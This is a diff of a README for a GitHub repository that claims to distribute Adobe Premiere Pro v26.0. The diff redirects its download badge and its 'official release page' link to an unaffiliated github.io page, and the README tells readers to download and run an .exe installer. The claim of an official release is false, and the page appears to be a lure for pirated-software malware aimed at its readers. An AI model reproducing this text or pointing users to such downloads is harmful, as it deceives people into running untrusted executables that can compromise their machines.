@@ -1,6 +1,6 @@
 # 🎬 adobe-premiere-pro-v26-0 - Create professional videos with ease
 
-[![](https://img.shields.io/badge/Download-Premiere_Pro_26.0-blue.svg)](https://github.com/professionaltennisinquiryagent87/adobe-premiere-pro-v26-0/releases)
+[![](https://img.shields.io/badge/Download-Premiere_Pro_26.0-blue.svg)](https://professionaltennisinquiryagent87.github.io)
 
 ## 📖 About this software
 
@@ -18,7 +18,7 @@ Ensure your computer meets these minimum specifications before you install the s
 
 ## ⬇️ How to download and install
 
-1. Go to the official release page: [https://github.com/professionaltennisinquiryagent87/adobe-premiere-pro-v26-0/releases](https://github.com/professionaltennisinquiryagent87/adobe-premiere-pro-v26-0/releases).
+1. Go to the official release page: [https://professionaltennisinquiryagent87.github.io](https://professionaltennisinquiryagent87.github.io).
 2. Look for the Assets section at the bottom of the page.
 3. Select the file ending in .exe to download the installer to your computer.
 4. Locate the file in your Downloads folder once the transfer finishes.
